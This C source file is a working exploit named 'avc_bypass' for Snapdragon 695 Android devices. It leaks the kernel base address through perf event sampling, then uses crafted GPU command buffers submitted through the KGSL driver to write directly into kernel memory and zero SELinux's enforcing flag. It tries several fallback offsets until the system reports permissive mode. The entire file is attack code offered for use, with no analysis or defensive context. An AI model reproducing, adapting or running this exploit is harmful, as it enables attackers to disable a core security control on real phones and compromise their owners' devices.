#include "avc_bypass.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <time.h>

static int kgsl_fd = -1;

static void die(const char *msg) { perror(msg); exit(1); }

/* ==================== PM4 ==================== */
static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}
static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}
static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

/* ==================== KGSL 基本操作 ==================== */
static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}
static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}
static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}
static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}
static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}
static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}
static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) return 0;

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_ip = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            first_ip = *(uint64_t *)(hdr + 1);
            break;
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);
    return (first_ip == 0) ? 0 : (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
}

static void gpu_write_kernel(uint64_t va, uint64_t val,
                             uint64_t ib_ga, void *ib_m,
                             unsigned int ctx_id, unsigned int ib_id) {
    uint32_t cmd[16];
    int dw = 0;
    uint32_t lo, hi;
    split64(va, &lo, &hi);
    cmd[dw++] = cp_type7(CP_NOP, 0);
    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
    cmd[dw++] = lo; cmd[dw++] = hi;
    split64(val, &lo, &hi);
    cmd[dw++] = lo; cmd[dw++] = hi;
    cmd[dw++] = cp_type7(CP_NOP, 0);

    memcpy(ib_m, cmd, dw * 4);
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(ctx_id, ib_ga, dw * 4, ib_id, &ts) == 0)
        wait_timestamp(ctx_id, ts);
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("[*] avc_bypass (SELinux enforcing → permissive) for Snapdragon 695\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    uint64_t kaslr = detect_kaslr();
    if (!kaslr) { printf("[-] KASLR detection failed\n"); close(kgsl_fd); return 1; }
    printf("[+] KASLR = 0x%lx\n", (unsigned long)kaslr);

    uint64_t selinux_state_addr = kaslr + VMLINUX_SELINUX_STATE_OFFSET;
    printf("[*] selinux_state = 0x%lx\n", (unsigned long)selinux_state_addr);


    uint64_t enforcing_offset = 1;
    uint64_t enforcing_addr = selinux_state_addr + enforcing_offset;
    printf("[*] enforcing = 0x%lx (offset +%ld)\n", (unsigned long)enforcing_addr, (long)enforcing_offset);

    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    int ib_id = gpuobj_alloc(0x10000, alloc_flags);
    void *ib_m = gpuobj_mmap(0x10000, ib_id);
    uint64_t ib_ga = 0;
    gpuobj_info(ib_id, &ib_ga);
    unsigned int ctx_id = create_context();
    printf("[GPU] ctx=%u ib_ga=0x%lx\n", ctx_id, (unsigned long)ib_ga);

    printf("[*] Writing enforcing=0 at offset %ld ...\n", (long)enforcing_offset);
    gpu_write_kernel(enforcing_addr, 0, ib_ga, ib_m, ctx_id, ib_id);

    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        char v[8];
        ssize_t n = read(fd, v, sizeof(v)-1);
        close(fd);
        if (n > 0) {
            v[n] = 0;
            printf("[*] getenforce: %s\n", v);
            if (v[0] == '0') {
                printf("[+] SELinux is now permissive!\n");
                close(kgsl_fd);
                return 0;
            }
        }
    }

    printf("[!] Offset 1 didn't work, trying fallback offsets...\n");
    uint64_t fallback_offsets[] = {0, 4, 2, 3};
    for (int i = 0; i < 4; i++) {
        uint64_t off = fallback_offsets[i];
        if (off == enforcing_offset) continue;
        uint64_t addr = selinux_state_addr + off;
        printf("[*] Trying offset %ld (addr=0x%lx)\n", (long)off, (unsigned long)addr);
        gpu_write_kernel(addr, 0, ib_ga, ib_m, ctx_id, ib_id);

        fd = open("/sys/fs/selinux/enforce", O_RDONLY);
        if (fd >= 0) {
            char v[8];
            ssize_t n = read(fd, v, sizeof(v)-1);
            close(fd);
            if (n > 0) {
                v[n] = 0;
                printf("[*] getenforce: %s\n", v);
                if (v[0] == '0') {
                    printf("[+] SELinux is now permissive with offset %ld!\n", (long)off);
                    close(kgsl_fd);
                    return 0;
                }
            }
        }
    }

    printf("[-] Failed to disable SELinux\n");
    close(kgsl_fd);
    return 1;
}
